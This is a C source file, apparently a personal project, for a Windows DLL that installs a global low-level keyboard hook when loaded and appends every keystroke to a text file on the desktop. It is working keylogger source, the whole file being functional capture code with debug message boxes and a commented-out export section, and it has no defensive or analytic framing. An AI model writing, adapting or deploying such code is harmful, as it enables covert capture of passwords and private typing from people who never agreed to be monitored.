#include<windows.h>
#include<stdio.h>
#include<stdlib.h>

#pragma comment(lib, "user32.lib")
#define VK_ENTER 0xD //enter key

void save_to_file(char *buffer){
    HANDLE file;
    DWORD written_bytes;
    
    file = CreateFileA("C:\\Users\\Olu-Ade\\Desktop\\C Projects\\windll\\lol.txt",FILE_APPEND_DATA,FILE_SHARE_READ|FILE_SHARE_WRITE,
        NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

    if(file==INVALID_HANDLE_VALUE){
        MessageBoxA(NULL,"i couldn't save pls debug","ERROR",MB_ICONERROR);
        return;
    }

  
    if(!WriteFile(file,buffer,strlen(buffer),&written_bytes,NULL)){
          MessageBoxA(NULL,"Failed to write to file","error",MB_OK|MB_ICONERROR);
    }
    
    CloseHandle(file);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lparam){
    if(nCode == HC_ACTION){
        KBDLLHOOKSTRUCT *KEYBOARDHOOK = (KBDLLHOOKSTRUCT*)lparam;
        char keyname_buff[600];
        DWORD written_bytes_bro;
        switch(wParam){
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN:
            if(KEYBOARDHOOK->vkCode == VK_SPACE){
                strcpy(keyname_buff," "); 
            }
            else if (KEYBOARDHOOK->vkCode == VK_ENTER)
            {
                strcpy(keyname_buff,"\n");
            }
            else{
            GetKeyNameText(MapVirtualKeyA(KEYBOARDHOOK->vkCode,MAPVK_VK_TO_VSC) <<16,
                            keyname_buff,sizeof(keyname_buff));
            }            
            save_to_file(keyname_buff);
            default:
                return CallNextHookEx(NULL,nCode,wParam,lparam);
        }
    }
    return CallNextHookEx(NULL,nCode,wParam,lparam);
}
//implement a simple keyborad hook
DWORD WINAPI some_thread(LPVOID lparam){
    MessageBox(NULL,"Hello from the dll thread!","Thread Message",MB_OK);
    return 0;
}

DWORD WINAPI SET_HOOK_THREAD(LPVOID lparam){
    HINSTANCE instance = GetModuleHandle(NULL);
    HHOOK key_board_hook = SetWindowsHookEx(WH_KEYBOARD_LL,LowLevelKeyboardProc,instance,0);
    if(!key_board_hook){
        MessageBox(NULL,"an error occured setting up the hook","TEST",MB_ICONERROR);
        return EXIT_FAILURE;
    }
    MSG msg;
    while(GetMessage(&msg,NULL,0,0)>0){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(key_board_hook);
    return 0;

}

BOOL APIENTRY DllMain(HMODULE hmodule,DWORD reason_for_call,LPVOID lpReserved){
    switch(reason_for_call){
        case DLL_PROCESS_ATTACH:
                MessageBox(NULL,"HELLO FROM current thread","help",MB_OK);
                CreateThread(NULL,0,SET_HOOK_THREAD,NULL,0,NULL);
                break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
/*
used if u want to export some functions from the dll and call them from the main program
__declspec(dllexport) BOOL WINAPI runMe(void){
    MessageBoxA(NULL,"Hello from the DLL!","DLL Message",MB_OK);
    return TRUE;
}
__declspec(dllexport) BOOL WINAPI runme2(void){
    MessageBoxA(NULL,"Hello from the DLL2! running notepad","DLL Message",MB_OK);
    system("start notepad.exe");
    return TRUE;
}
    */